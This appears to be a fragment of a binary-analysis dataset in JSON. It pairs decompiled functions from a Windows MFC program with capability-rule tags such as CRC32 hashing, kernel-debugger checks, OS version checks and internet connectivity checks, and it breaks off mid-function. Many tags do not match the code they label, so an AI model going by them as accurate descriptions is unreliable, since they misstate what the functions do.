        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t fcn.0041cc46(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint noname_1;\n    uint32_t uVar4;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_10h;\n    int32_t *noname_4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hWnd;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_13;\n    \n    noname_13 = 0x41cc50;\n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = &fcn.0041cc46::var_20h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    iVar2 = extraout_ECX[0x11];\n    *(unaff_EBP + -0x18) = extraout_ECX[0x12];\n    var_20h = unaff_EDI;\n    var_1ch = unaff_ESI;\n    var_18h = unaff_EBX;\n    iVar1 = fcn.00423ff7();\n    uVar5 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x10] != 0) {\n        iVar2 = fcn.00423ff7();\n        uVar5 = *(iVar2 + 0xc);\n        uVar3 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar5, extraout_ECX[0x10], 5);\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar5, uVar3);\n    }\n    if (iVar2 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2);\n        *(unaff_EBP + -0x18) = uVar3;\n    }\n    if (*(unaff_EBP + -0x18) == 0) {\n        iVar2 = -1;\n    }\n    else {\n        uVar3 = fcn.0041cbca();\n        *(unaff_EBP + -0x14) = uVar3;\n        fcn.0041e041();\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar2 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14));\n            if (iVar2 != 0) {\n                (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n                *(unaff_EBP + -0x20) = 1;\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        noname_4 = extraout_ECX;\n        fcn.0041dff5();\n        uVar3 = *(unaff_EBP + -0x14);\n        noname_1 = fcn.0041db42();\n        iVar2 = fcn.0041c957(*(unaff_EBP + -0x18), noname_1, uVar5, uVar3, noname_4, var_20h, var_1ch, var_18h, hWnd, \n                             in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h, noname_13, unaff_retaddr, param_1, \n                             param_2, param_3, var_10h);\n        if (iVar2 != 0) {\n            if ((*(extraout_ECX + 9) & 0x10) != 0) {\n                uVar5 = 4;\n                uVar4 = fcn.0042031c();\n                if ((uVar4 & 0x100) != 0) {\n                    uVar5 = 5;\n                }\n                fcn.0041fcb9(uVar5);\n            }\n            if (extraout_ECX[7] != 0) {\n                fcn.00420402(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar2 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar2 == extraout_ECX[7]) {\n                (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n            }\n        }\n        (**(*extraout_ECX + 0x58))();\n        fcn.0041cc04();\n        iVar2 = extraout_ECX[0xb];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 1314
    },
    "0041fcb9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041fd11)\n// WARNING: Removing unreachable block (ram,0x0041fd20)\n// WARNING: Removing unreachable block (ram,0x0041fd26)\n// WARNING: Removing unreachable block (ram,0x0041fd38)\n// WARNING: Removing unreachable block (ram,0x0041fd3f)\n// WARNING: Removing unreachable block (ram,0x0041fd45)\n// WARNING: Removing unreachable block (ram,0x0041fd4b)\n// WARNING: Removing unreachable block (ram,0x0041fd5e)\n// WARNING: Removing unreachable block (ram,0x0041fd65)\n// WARNING: Removing unreachable block (ram,0x0041fd81)\n\nint32_t __thiscall fcn.0041fcb9(int32_t *param_1, uint8_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    \n    if ((param_2 & 4) != 0) {\n        fcn.0042031c();\n    }\n    (*_sym.imp.USER32.dll_GetParent)(param_1[7]);\n    param_1[9] = param_1[9] | 0x18;\n    iVar2 = fcn.0041bd38();\n    pcVar1 = _sym.imp.USER32.dll_UpdateWindow;\n    while( true ) {\n        piVar3 = fcn.0041bd38();\n        iVar4 = (**(*piVar3 + 0x5c))();\n        if (iVar4 == 0) {\n            fcn.00427988(0);\n            return -1;\n        }\n        if ((unaff_EBX != 0) && ((*(iVar2 + 0x34) == 0x118 || (*(iVar2 + 0x34) == 0x104)))) {\n            fcn.00420451(1);\n            (*pcVar1)(param_1[7]);\n            unaff_EBX = 0;\n        }\n        iVar4 = (**(*param_1 + 0x70))();\n        if (iVar4 == 0) break;\n        piVar3 = fcn.0041bd38();\n        iVar4 = (**(*piVar3 + 100))(iVar2 + 0x30);\n        if (iVar4 != 0) {\n            unaff_EBX = 0;\n        }\n        (*_sym.imp.USER32.dll_PeekMessageA)(iVar2 + 0x30, 0, 0, 0, 0);\n    }\n    param_1[9] = param_1[9] & 0xffffffe7;\n    return param_1[0xb];\n}\n",
        "token_count": 612
    },
    "0041fefb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nbool __cdecl fcn.0041fefb(uint32_t arg_8h)\n\n{\n    uint noname_8;\n    uint noname_11;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    bool bVar4;\n    uint *noname_0;\n    uint32_t var_34h;\n    uint var_30h;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00423ff7();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.0040b990(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.00423ff7();\n        noname_11 = *0x44d738;\n        noname_8 = *(iVar1 + 8);\n        noname_0 = 0x8;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            noname_0 = &var_34h;\n            var_34h = 0xb;\n            iVar1 = fcn.0041e736(noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0xb, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, *0x44d738, var_18h, in_stack_ffffffe8, \n                                 \"AfxWnd42s\", 8, var_8h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            iVar1 = fcn.0041e736(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, var_34h, var_30h, \n                                 in_stack_ffffffd0, in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, var_18h, \n                                 in_stack_ffffffe8, \"AfxOleControl42s\", var_ch);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            iVar1 = fcn.0041e736(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, 0x10, in_stack_ffffffe8, \n                                 \"AfxControlBar42s\", var_ch);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            iVar1 = fcn.0041fe43(&var_34h, \"AfxMDIFrame42s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            iVar1 = fcn.0041fe43(&var_34h, \"AfxFrameOrView42s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0041fe84(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0041fe84(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0041fe84(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0041fe84(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0041fe84(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0041fe84(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0041fe84(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0041fe84(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0041fe84(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0041fe84(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0041fe84(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0041fe84(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0041fe84(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            uVar3 = uVar3 | 0x10;\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 2140
    },
    "004202e9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004202e9(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x25) & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(param_1 + 0x1c), param_2);\n    }\n    else {\n        iVar1 = fcn.00423ff7();\n        (**(**(iVar1 + 0x1038) + 0x24))(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "00420ba6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00420ba6(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t *arg_8h;\n    uint32_t uVar2;\n    \n    param_1[1] = param_3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n        fcn.0040bb50(arg_8h, param_3 + 0x40, param_1[1]);\n        if (*(arg_8h + 2) == -1) {\n            uVar2 = arg_8h[3];\n        }\n        else {\n            uVar2 = *arg_8h;\n        }\n        param_1[2] = ~uVar2 >> 6 & 1;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 255
    },
    "00422642": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.00422642(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    piVar1 = *(unaff_EBP + 8);\n    iVar2 = *piVar1;\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    (**(iVar2 + 0x18))(extraout_ECX + 4);\n    uVar3 = *(unaff_EBP + 0xc);\n    extraout_ECX[3] = 0xffffffff;\n    extraout_ECX[5] = uVar3;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[8] = piVar1;\n    extraout_ECX[0xe] = 0;\n    extraout_ECX[0xd] = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[1] = 1;\n    if ((~uVar3 & 1) == 0) {\n        extraout_ECX[0xf] = 0x40;\n    }\n    else {\n        extraout_ECX[0xf] = 0x10;\n    }\n    uVar3 = *(unaff_EBP + 0x14);\n    extraout_ECX[6] = 1;\n    extraout_ECX[0xb] = uVar3;\n    iVar2 = *(unaff_EBP + 0x10);\n    extraout_ECX[0x10] = 0x89;\n    extraout_ECX[2] = 0;\n    if (iVar2 < 0x80) {\n        extraout_ECX[7] = 0x80;\n        extraout_ECX[0xb] = 0;\n    }\n    else {\n        extraout_ECX[7] = iVar2;\n    }\n    iVar2 = extraout_ECX[0xb];\n    *(unaff_EBP + 0x10) = extraout_ECX[7];\n    if (iVar2 == 0) {\n        iVar2 = (**(*piVar1 + 0x50))(3, 0, 0, 0);\n        extraout_ECX[2] = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = fcn.0041bd04(extraout_ECX[7]);\n            extraout_ECX[0xb] = uVar3;\n            extraout_ECX[6] = 0;\n        }\n        else {\n            *(unaff_EBP + 0x10) = 0;\n        }\n    }\n    iVar4 = *(unaff_EBP + 0x10) + extraout_ECX[0xb];\n    extraout_ECX[10] = iVar4;\n    iVar2 = extraout_ECX[0xb];\n    if ((*(extraout_ECX + 5) & 1) != 0) {\n        iVar2 = iVar4;\n    }\n    uVar3 = *(unaff_EBP + -0xc);\n    extraout_ECX[9] = iVar2;\n    *in_FS_OFFSET = uVar3;\n    return extraout_ECX;\n}\n",
        "token_count": 819
    },
    "00422953": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422953(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(param_1 + 0x14) & 1) == 0) {\n        iVar1 = *(param_1 + 0x24);\n        iVar2 = *(param_1 + 0x2c);\n        if (*(param_1 + 8) == 0) {\n            if (iVar1 != iVar2) {\n                (**(**(param_1 + 0x20) + 0x38))(iVar2, iVar1 - iVar2);\n            }\n        }\n        else {\n            if (iVar1 != iVar2) {\n                (**(**(param_1 + 0x20) + 0x50))(2, iVar1 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x20) + 0x50))(1, *(param_1 + 0x1c), param_1 + 0x2c, param_1 + 0x28);\n        }\n        *(param_1 + 0x24) = *(param_1 + 0x2c);\n    }\n    else {\n        if (*(param_1 + 0x28) != *(param_1 + 0x24)) {\n            (**(**(param_1 + 0x20) + 0x28))(*(param_1 + 0x24) - *(param_1 + 0x28), 1);\n        }\n        *(param_1 + 0x24) = *(param_1 + 0x28);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004244a1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004244a1(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    \n    iVar6 = param_1 + 0x1c;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar6);\n    iVar7 = *(param_1 + 4);\n    iVar8 = *(param_1 + 8);\n    if ((iVar7 <= iVar8) || ((*(*(param_1 + 0x10) + iVar8 * 8) & 1) != 0)) {\n        iVar8 = 1;\n        if (1 < iVar7) {\n            puVar3 = *(param_1 + 0x10);\n            do {\n                puVar3 = puVar3 + 8;\n                if ((*puVar3 & 1) == 0) break;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < iVar7);\n            if (iVar8 < iVar7) goto code_r0x00424586;\n        }\n        iVar7 = iVar7 + 0x20;\n        if (*(param_1 + 0x10) == 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2002, iVar7 * 8);\n        }\n        else {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(*(param_1 + 0x10));\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar5);\n            iVar4 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)(uVar5, iVar7 * 8, 0x2002);\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GlobalLock;\n        if (iVar4 == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(*(param_1 + 0x10));\n            (*pcVar2)(uVar5);\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar6);\n            fcn.0041b368();\n        }\n        iVar6 = (*pcVar2)(iVar4);\n        fcn.0040b990(iVar6 + *(param_1 + 4) * 8, 0, (*(param_1 + 4) * 0x1fffffff + iVar7) * 8);\n        *(param_1 + 0x10) = iVar6;\n        *(param_1 + 4) = iVar7;\n    }\ncode_r0x00424586:\n    if (*(param_1 + 0xc) <= iVar8) {\n        *(param_1 + 0xc) = iVar8 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar8 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar8 + 1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n    return iVar8;\n}\n",
        "token_count": 706
    },
    "00402d60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00402d60(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x427e27;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    iVar4 = 0;\n    fcn.0041d2e7(0x44b7b4);\n    uStack8 = 1;\n    iVar2 = sub.WSOCK32.dll_gethostbyname(param_1);\n    if (iVar2 != 0) {\n        for (; *(*(iVar2 + 0xc) + iVar4) != 0; iVar4 = iVar4 + 4) {\n            iVar5 = 0;\n            if (0 < *(iVar2 + 10)) {\n                do {\n                    uStack12 = CONCAT31(uStack12._1_3_, 2);\n                    if (0 < iVar5) {\n                        fcn.0041d507(0x4493ec);\n                    }\n                    uVar3 = *(*(*(iVar2 + 0xc) + iVar4) + iVar5);\n                    fcn.0041b2e9(*0x10, 0x4493e8, uVar3);\n                    fcn.0041d52e(uVar3, *0x10);\n                    fcn.0041d2bd();\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < *(iVar2 + 10));\n            }\n        }\n    }\n    uVar1 = uStack4;\n    fcn.0041d032(&stack0xffffffe4);\n    fcn.0041d2bd();\n    *in_FS_OFFSET = unaff_EBX;\n    return uVar1;\n}\n",
        "token_count": 442
    },
    "0041c919": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041c919(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0041e372();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041e1b5();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 200
    },
    "00403475": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00403475(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    if (param_2 == 0) {\n        puVar1 = param_1 + 0x12;\n    }\n    else {\n        puVar1 = param_1 + 0x18;\n    }\n    uVar2 = *puVar1;\n    if (uVar2 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        while (puVar1 = puVar1 + 1,  uVar2 != 0) {\n            uVar2 = *puVar1;\n        }\n    }\n    uVar2 = *puVar1;\n    if (uVar2 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        while (puVar1 = puVar1 + 1,  uVar2 != 0) {\n            uVar2 = *puVar1;\n        }\n    }\n    return *puVar1 + 5 + puVar1 & 0xfffffffc;\n}\n",
        "token_count": 261
    },
    "004038b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038b5(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = arg_8h;\n    if (*(arg_8h + 0x34) != 0) {\n        var_4h = -(*(*(arg_8h + 0x34) + 0x2c) != 0);\n        while (var_4h != 0) {\n            fcn.0041ba8b(&var_4h, &var_8h, &arg_8h);\n            iVar2 = *(arg_8h + 0x8c);\n            while (iVar2 != 0) {\n                fcn.0040981d(arg_8h);\n                if (*(iVar2 + 4) != 0) {\n                    iVar2 = fcn.00420262(*(iVar2 + 4));\n                    fcn.00409826(*(iVar2 + 0x38));\n                }\n                iVar2 = fcn.0040983a();\n            }\n            if (*(arg_8h + 0x90) != 0) {\n                iVar2 = fcn.00420262(*(arg_8h + 0x90));\n                (**(**(iVar2 + 0x38) + 0xb0))();\n                *(arg_8h + 0x90) = *(iVar2 + 0x38);\n                (**(**(*(iVar2 + 0x38) + 0x88) + 8))(arg_8h, 1);\n            }\n        }\n        var_4h = -(*(*(iVar1 + 0x34) + 0x2c) != 0);\n        while (var_4h != 0) {\n            fcn.0041ba8b(&var_4h, &var_8h, &arg_8h);\n            if (*(arg_8h + 0x88) != NULL) {\n                (**(**(arg_8h + 0x88) + 0xc))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "004039d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8ch\n\nuint __cdecl\nfcn.004039d0(uint arg_8h, uint hWndInsertAfter, uint pbstr, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    ushort uVar1;\n    ushort uVar2;\n    uint16_t uVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint *puVar10;\n    int32_t unaff_EBP;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    int32_t iVar13;\n    uint *puVar14;\n    uint *in_FS_OFFSET;\n    uint var_8ch;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_56h;\n    uint var_50h;\n    uint lpRect;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    puVar14 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x18) = puVar14 + 0x12;\n    if (*(unaff_EBP + 0x10) != 0) {\n        uVar1 = *(puVar14 + 0x12);\n        *(unaff_EBP + -100) = puVar14[2];\n        *(unaff_EBP + -0x60) = puVar14[1];\n        *(unaff_EBP + -0x5c) = *(puVar14 + 3);\n        *(unaff_EBP + -0x5a) = *(puVar14 + 0xe);\n        uVar2 = *(puVar14 + 4);\n        *(unaff_EBP + -0x56) = uVar1;\n        uVar1 = *(puVar14 + 5);\n        puVar10 = puVar14 + 6;\n        *(unaff_EBP + -0x58) = uVar2;\n        *(unaff_EBP + -0x54) = uVar1;\n        puVar14 = unaff_EBP + -100;\n        *(unaff_EBP + -0x18) = puVar10;\n    }\n    iVar4 = *(puVar14 + 10);\n    iVar5 = *(puVar14 + 3);\n    iVar6 = *(puVar14 + 2);\n    *(unaff_EBP + -0x34) = *(puVar14 + 0xe) + iVar4;\n    *(unaff_EBP + -0x40) = iVar6;\n    iVar13 = *(*(unaff_EBP + 8) + 0x1c);\n    *(unaff_EBP + -0x3c) = iVar4;\n    *(unaff_EBP + -0x38) = iVar5 + iVar6;\n    (*_sym.imp.USER32.dll_MapDialogRect)(iVar13, unaff_EBP + -0x40);\n    piVar11 = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + 0x10) = 0;\n    if (3 < *(unaff_EBP + 0x20)) {\n        iVar8 = *piVar11;\n        *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) + -4;\n        piVar11 = piVar11 + 1;\n        if (iVar8 != 0) {\n            uVar7 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)(piVar11, iVar8);\n            *(unaff_EBP + 0x10) = uVar7;\n            piVar11 = piVar11 + iVar8 * 2;\n            *(unaff_EBP + 